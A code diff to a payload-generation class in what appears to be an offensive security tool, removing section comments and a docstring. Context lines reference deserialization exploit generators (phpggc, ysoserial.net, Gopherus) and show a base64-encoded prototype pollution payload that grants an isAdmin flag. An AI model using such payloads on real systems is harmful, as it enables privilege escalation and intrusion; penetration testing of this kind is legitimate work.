@@ -186,7 +186,6 @@ class PayloadMutation:
         return []
     
     
-    ##PHP
     
     PHPGGC_PATH = get_tool_path("phpggc")
     
@@ -479,7 +478,6 @@ class PayloadMutation:
 
         return results
 
-    ## Python Pickle
 
     PICKLE_TEST_COMMANDS = TEST_COMMANDS
 
@@ -503,7 +501,6 @@ class PayloadMutation:
             results.append(payload)
         return results
 
-    ## YAML
 
     YAML_TEST_COMMANDS = TEST_COMMANDS
 
@@ -521,7 +518,6 @@ class PayloadMutation:
             results.append(payload)
         return results
 
-    ## NodeJS
 
     NODEJS_TEST_COMMANDS = TEST_COMMANDS
 
@@ -542,7 +538,6 @@ class PayloadMutation:
                 results.append(payload)
             return results
 
-        # proto_pollution
         raw = '{"__proto__": {"isAdmin": true, "polluted": true}}'
         b64 = base64.b64encode(raw.encode()).decode()
         payload = self._make_payload("prototype_pollution", "__proto__ injection", None, b64)
@@ -551,7 +546,6 @@ class PayloadMutation:
         results.append(payload)
         return results
 
-    ## Ruby Marshal
 
     RUBY_TEST_COMMANDS = TEST_COMMANDS
 
@@ -587,7 +581,6 @@ class PayloadMutation:
 
         return results
 
-    ## .NET
 
     YSOSERIALNET_PATH = get_tool_path("ysoserial_net")
 
@@ -672,7 +665,6 @@ class PayloadMutation:
             results.append(payload)
         return results
 
-    ## Wrapper
 
     GOPHERUS_PATH = get_tool_path("gopherus")
 
@@ -747,11 +739,6 @@ class PayloadMutation:
     _PYTHON2_CANDIDATES = ["python2", "py -2", r"C:\Python27\python.exe"]
 
     def _find_python2(self) -> list[str] | None:
-        """Gopherus (Analyze/third_tool/gopherus) is Python 2-only source.
-        Tries common ways a Python 2 interpreter might be installed/aliased
-        and returns the first one that responds to --version, or None if
-        none is available.
-        """
         for candidate in self._PYTHON2_CANDIDATES:
             cmd = candidate.split()
             try:
